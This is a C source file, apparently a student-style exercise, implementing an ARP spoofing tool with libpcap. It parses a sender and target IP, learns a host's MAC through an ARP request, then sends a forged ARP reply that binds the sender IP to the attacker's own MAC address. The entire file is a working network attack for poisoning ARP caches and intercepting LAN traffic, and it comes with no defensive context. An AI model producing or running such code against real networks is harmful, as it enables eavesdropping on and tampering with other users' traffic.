#include <pcap.h>
#include <stdio.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <net/if.h>
#include <unistd.h>
#include <string.h>

void usage() {
    printf("syntax: arp_spoof <interface> <sender ip> <target ip>\n");
}

int pow(int a, int b){
    int k = 1;
    for (int i = 0; i < b; i++) k *= a;
    return k;
}

long mac_addr_sys (uint8_t *addr){
    struct ifreq ifr;
    struct ifreq *IFR;
    struct ifconf ifc;
    char buf[1024];
    int s, i;
    int ok = 0;
    s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s==-1) {
        return -1;
    }
    ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    ioctl(s, SIOCGIFCONF, &ifc);
    IFR = ifc.ifc_req;
    for (i = ifc.ifc_len / sizeof(struct ifreq); --i >= 0; IFR++) {
        strcpy(ifr.ifr_name, IFR->ifr_name);
        if (ioctl(s, SIOCGIFFLAGS, &ifr) == 0) {
            if (! (ifr.ifr_flags & IFF_LOOPBACK)) {
                if (ioctl(s, SIOCGIFHWADDR, &ifr) == 0) {
                    ok = 1;
                    break;
                }
            }
        }
    }
    close(s);
    if (ok) {
        bcopy( ifr.ifr_hwaddr.sa_data, addr, 6);
    }
    else {
        return -1;
    }
    return 0;
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
	usage();
	return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }

    uint8_t sender_ip[4] = {0, 0, 0, 0};
    uint8_t target_ip[4] = {0, 0, 0, 0};

    int iter = 3;
    int exp = 0;
    for (int i = strlen(argv[2]) - 1; i >= 0; i--) {
	if (argv[2][i] != '.') {
	    sender_ip[iter] += (argv[2][i] - 48) * pow(10, exp);
	    exp++;
	}
	else if (argv[2][i] == '.') {
	    exp = 0;
	    iter--;
	}
    }

    iter = 3;
    exp = 0;
    for (int i = strlen(argv[3]) - 1; i >= 0; i--) {
	if (argv[3][i] != '.') {
	    target_ip[iter] += (argv[3][i] - 48) * pow(10, exp);
	    exp++;
	}
	else if (argv[3][i] == '.') {
	    exp = 0;
	    iter--;
	}
    }

    uint8_t att_mac[6];
    mac_addr_sys(att_mac);
    
    uint8_t rq_packet[42];
//Ethernet header
    for (int i = 0; i < 6; i++) rq_packet[i] = 0xff;
    for (int i = 6; i < 12; i++) rq_packet[i] = att_mac[i - 6];
    rq_packet[12] = 0x08;
    rq_packet[13] = 0x06;
//ARP header
    rq_packet[14] = 0x00;
    rq_packet[15] = 0x01;
    rq_packet[16] = 0x08;
    rq_packet[17] = 0x00;
    rq_packet[18] = 0x06;
    rq_packet[19] = 0x04;
    rq_packet[20] = 0x00;
    rq_packet[21] = 0x01;
    for (int i = 22; i < 28; i++) rq_packet[i] = att_mac[i - 22];
    for (int i = 28; i < 32; i++) rq_packet[i] = sender_ip[i - 28];
    for (int i = 32; i < 38; i++) rq_packet[i] = 0x00;
    for (int i = 38; i < 42; i++) rq_packet[i] = target_ip[i - 38];
    
    pcap_sendpacket(handle, rq_packet, 42);
//sender's mac address
    uint8_t sen_mac[6];

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        if (packet[12] == 0x08 && packet[13] == 0x06) {
	    if (packet[20] == 0x00 && packet[21] == 0x02) {
		for (int i = 22; i < 28; i++) sen_mac[i - 22] = packet[i];
		break;
	    }
	}
    }
    
    uint8_t rp_packet[42];
//Ethernet header
    for (int i = 0; i < 6; i++) rp_packet[i] = sen_mac[i];
    for (int i = 6; i < 12; i++) rp_packet[i] = att_mac[i - 6];
    rp_packet[12] = 0x08;
    rp_packet[13] = 0x06;
//ARP header
    rp_packet[14] = 0x00;
    rp_packet[15] = 0x01;
    rp_packet[16] = 0x08;
    rp_packet[17] = 0x00;
    rp_packet[18] = 0x06;
    rp_packet[19] = 0x04;
    rp_packet[20] = 0x00;
    rp_packet[21] = 0x02;
    for (int i = 22; i < 28; i++) rp_packet[i] = att_mac[i - 22];
    for (int i = 28; i < 32; i++) rp_packet[i] = sender_ip[i - 28];
    for (int i = 32; i < 38; i++) rp_packet[i] = sen_mac[i - 32];
    for (int i = 38; i < 42; i++) rp_packet[i] = target_ip[i - 38];

    pcap_sendpacket(handle, rp_packet, 42);
}

